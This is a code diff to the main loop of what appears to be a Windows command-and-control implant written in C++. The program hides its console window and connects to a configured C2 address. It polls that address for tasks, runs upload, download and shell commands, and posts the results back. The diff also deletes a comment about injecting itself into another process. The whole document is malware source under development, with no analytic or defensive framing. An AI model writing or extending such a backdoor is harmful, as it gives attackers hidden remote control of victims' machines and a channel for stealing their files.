@@ -11,7 +11,6 @@
 #include "Config.h"
 #include "Agent.h"
 #include "Command.h"
-#include "Shell.h"
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -21,28 +20,26 @@ int main()
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	Agent agent(C2_IP, C2_PORT);
 	Command cmdHandler;
-	Shell shell;
 
-	// add inject self into smth else/
-	//Agent::Register();
 
-	cmdHandler.RegisterCommand(UPLOAD_CMD, shell);
-	cmdHandler.RegisterCommand(DOWNLOAD_CMD, "download");
-	cmdHandler.RegisterCommand(SHELL_CMD, "shell");
+	cmdHandler.RegisterCommand(UPLOAD_CMD, agent.upload);
+	cmdHandler.RegisterCommand(DOWNLOAD_CMD, agent.download);
+	cmdHandler.RegisterCommand(SHELL_CMD, agent.shell);
+
 
 	while (true) {
 		std::string task = agent.Get(TASK_URI);
 
 		if (task != "") {
 			std::vector <std::string> Task = split(task);
-			std::string Command = Task[0];
+			std::string Cmd = Task[0];
 
-			if (cmdHandler.HasCommand(Command)) {
+			if (cmdHandler.HasCommand(Cmd)) {
 				std::string result;
 				
-				result = cmdHandler.ExecuteCommand(Command);
+				result = cmdHandler.ExecuteCommand(Cmd);
 
-				agent.Post(result);
+				agent.Post(RETURN_URI, result);
 			}		
 		}
 
